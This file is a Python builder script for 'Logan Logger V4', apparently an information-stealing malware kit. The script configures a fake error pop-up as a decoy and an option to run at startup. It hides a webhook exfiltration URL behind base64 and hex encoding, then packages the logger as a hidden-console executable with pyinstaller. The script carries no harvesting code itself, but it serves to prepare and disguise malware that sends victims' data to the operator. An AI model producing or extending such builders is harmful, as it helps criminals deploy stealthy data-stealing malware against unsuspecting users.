import os
import ctypes 
import base64

ctypes.windll.kernel32.SetConsoleTitleW("Logan Logger V4 | Setup")

os.system('cls')

msg = input('show error message? (Y/N) ')
if msg.lower() == 'y':
    with open('stuff/msgbox.py', 'w', encoding='utf-8') as f:
        f.write('errerror = True\n')
        mtype = input('enter message type (error, info, warning): ')
        if mtype.lower() == 'error':
            f.write(f'errtype = "error"\n')
        elif mtype.lower() == 'info':
            f.write(f'errtype = "info"\n')
        elif mtype.lower() == 'warning':
            f.write(f'errtype = "warning"\n')
        else:
            f.write(f'errtype = "warning"\n')
        ms = input('enter message: ')
        f.write(f'errmg = "{ms}"')
elif msg.lower() == 'n':
    with open('stuff/msgbox.py', 'w', encoding='utf-8') as f:
        f.write('errerror = False')
else:
    print("[-] You didn't enter a valid response, skipping")
    with open('stuff/msgbox.py', 'w', encoding='utf-8') as f:
        f.write('errerror = False')

startup = input('Startup? ')
with open('conf.py', 'w', encoding='utf-8') as f:
    if startup.lower() == 'y':
        f.write('strtup = True')
    elif startup.lower() == 'n':
        f.write('strtup = False')
    else:
        print("[-] You didn't enter a valid response, skipping")
whurl = input('Enter webhook URL: ')
encwb = base64.b64encode(whurl.encode()).decode()
enccode = f"base64.b64decode('{encwb}')"
enchex = enccode.encode('utf-8').hex()

with open("blahlivmata.py", "w") as ll:
    ll.write(f"hex = '{enchex}'\n")
    
print("(+) Sent webhook. Building EXE.")
os.system('pip install -r requirements.txt')
os.system("pyinstaller --onefile --noconsole main.py")

os.startfile('dist')


